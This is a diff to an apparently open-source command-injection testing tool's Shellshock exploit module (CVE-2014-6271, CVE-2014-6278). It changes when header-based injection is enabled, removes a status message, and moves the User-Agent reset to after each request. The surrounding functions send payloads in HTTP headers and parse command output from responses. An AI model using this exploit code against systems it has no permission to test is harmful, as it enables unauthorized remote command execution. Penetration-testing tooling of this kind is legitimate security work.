@@ -29,6 +29,14 @@ This module exploits the vulnerabilities CVE-2014-6271 [1], CVE-2014-6278 [2] in
 [2] CVE-2014-6278: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
 """
 
+if settings.MULTI_TARGETS or not settings.IS_TTY:
+  if settings.COOKIE_INJECTION == True:
+    settings.COOKIE_INJECTION = None
+  if settings.USER_AGENT_INJECTION == True:
+    settings.USER_AGENT_INJECTION = None
+  if settings.REFERER_INJECTION == True:
+    settings.REFERER_INJECTION = None
+
 # Available HTTP headers
 headers = [
 "User-Agent",
@@ -592,11 +600,6 @@ def shellshock_handler(url, http_request_method, filename):
   injection_type = "results-based command injection"
   technique = "shellshock injection technique"
 
-  info_msg = "Testing the " + technique + ". "
-  if settings.VERBOSITY_LEVEL >= 2:
-    info_msg = info_msg + "\n"
-  print(settings.print_info_msg(info_msg))
-
   try: 
     i = 0
     total = len(shellshock_cves) * len(headers)
@@ -621,8 +624,6 @@ def shellshock_handler(url, http_request_method, filename):
         request = _urllib.request.Request(url, None, header)
         if check_header == "User-Agent":
           menu.options.agent = payload
-        else:
-          menu.options.agent = default_user_agent  
         log_http_headers.do_check(request)
         log_http_headers.check_http_traffic(request)
         # Check if defined any HTTP Proxy.
@@ -633,6 +634,8 @@ def shellshock_handler(url, http_request_method, filename):
           response = tor.use_tor(request)
         else:
           response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
+        if check_header == "User-Agent":
+          menu.options.agent = default_user_agent  
         percent = ((i*100)/total)
         float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
 
@@ -880,8 +883,6 @@ def cmd_exec(url, cmd, cve, check_header, filename):
       request = _urllib.request.Request(url, None, header)
       if check_header == "User-Agent":
         menu.options.agent = payload
-      else:
-        menu.options.agent = default_user_agent
       log_http_headers.do_check(request)
       log_http_headers.check_http_traffic(request)
       # Check if defined any HTTP Proxy.
@@ -892,6 +893,8 @@ def cmd_exec(url, cmd, cve, check_header, filename):
         response = tor.use_tor(request)
       else:
         response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
+      if check_header == "User-Agent":
+        menu.options.agent = default_user_agent  
       shell = checks.page_encoding(response, action="decode").rstrip().replace('\n',' ')
       shell = re.findall(r"" + TAG + "(.*)" + TAG, shell)
       shell = ''.join(shell)
